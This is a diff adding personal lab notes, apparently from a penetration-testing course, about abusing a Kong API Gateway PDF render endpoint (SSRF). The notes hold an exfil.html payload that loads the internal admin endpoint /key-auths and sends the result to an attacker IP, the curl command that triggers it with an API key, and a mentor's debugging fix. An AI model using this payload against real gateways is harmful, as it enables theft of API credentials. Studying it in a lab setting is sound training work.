@@ -1473,3 +1473,47 @@ With the other plugins available in Kong API Gateway, find a way to log all traf
 
 
 
+Take a look at:
+
+I tried:
+
+```
+exfil.html:
+
+<html>
+<head>
+<script>
+function exfiltrate() {
+    fetch("http://172.16.16.2:8001/key-auths")
+    .then((response) => response.text())
+    .then((data) => {
+        fetch("http://192.168.45.204/callback?" + document.getElementById('key'));
+    }).catch(err => {
+        fetch("http://192.168.45.204/error?" + encodeURIComponent(err));
+    });
+}
+</script>
+</head>
+<body onload='exfiltrate()'>
+<div></div>
+</body>
+</html>
+
+
+I am calling this:
+curl "http://apigateway:8000/render?url=http://<KALI IP>/exfil.html&apikey=SBzrCb94o9JOWALBvDAZLnHo3s90smjC" --output l.pdf
+
+I am getting this in log:
+
+"GET /callback?null HTTP/1.1" 404
+```
+
+Mentor suggestion:
+
+```
+.then((data) => {
+        document.getElementById("data").innerText = data
+    }).catch(err => {
+        document.getElementById("data").innerText = err
+    });
+```
